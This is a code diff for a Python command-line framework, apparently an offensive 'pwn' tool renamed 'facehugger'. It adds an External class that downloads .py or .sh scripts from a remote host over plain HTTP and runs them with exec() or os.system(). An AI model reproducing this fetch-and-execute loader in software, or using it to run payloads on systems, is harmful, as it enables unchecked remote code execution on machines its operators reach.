@@ -1,17 +1,12 @@
 # Libraries
 # ---------
-# 2 libraries to find them all
 import subprocess
 import os
-# 2 libraries to scrape them all
 import requests
 from bs4 import BeautifulSoup
-# 1 library to make things colourful
 from termcolor import colored
-# And in the darkness pwn them
-
-# *cough* oh and these  *cough*
 import re, sys
+
 class Terminal:
     """ Provides methods that provide command line functionality to let the user 
     load and run additional modules and provides the interface to let them interface
@@ -34,9 +29,9 @@ class Terminal:
         """ Show the command line and take input """
         while True:
             if self.current_module != None:
-                cmd = input(f'pype~{self.current_module.name}# ')
+                cmd = input(f'facehugger~{self.current_module.name}# ')
             else:
-                cmd = input(f'pype~# ')
+                cmd = input(f'facehugger~# ')
             self.runCommand(cmd)
 
     def runCommand(self, cmd):
@@ -71,7 +66,7 @@ class Terminal:
             self.runModule()
         elif cmd[0] == "extern" and 1 < len(cmd) <= 4:
             if len(cmd) == 2:
-                self.runExteranl(cmd[1])
+                self.runExternal(cmd[1])
             elif len(cmd) == 3:
                 self.runExteranl(cmd[1], cmd[2])
             else:
@@ -152,11 +147,12 @@ class Terminal:
         exit(0)
 
     def runExternal(self, resource, host=None, foreground=True):
-        """ Create an instance of external class to handle script, create a new thread to do so if fg set """
+        """ Create an instance of external class to handle script, create a new thread 
+            to do so if fg set (not done)"""
         if not host:
             host = self.remote_host
         print("[*] Loading external script from http://"+host+"/"+resource)
-        session = External(resocure, host, foreground)
+        session = External(resource, host, foreground)
         result = session.begin()
         if result:
             print("[*] Script ran successfully")
@@ -166,9 +162,28 @@ class Terminal:
 class External:
     def __init__(self, resource, host, foreground):
         self.fg = foreground
+        self.host = host
+        self.resource = resource 
 
-    def begin():
-        pass
+    def runPython(self, raw):
+        exec(raw)
+        return True
+
+    def runBash(self, raw):
+        os.system(raw)
+        return True
+
+    def begin(self):
+        print("[*] Downloading script from http://"+self.host+"/"+self.resource)
+        raw = requests.get("http://"+self.host+"/"+self.resource).text
+        ext = self.resource.split('.')[-1]
+        if ext == 'py':
+            return self.runPython(raw)
+        elif ext == 'sh':
+            return self.runBash(raw)
+        else:
+            print("[!] File type not supported. Please select a python or bash file")
+            return False
 
 class BaseModule:
     def __init__(self):
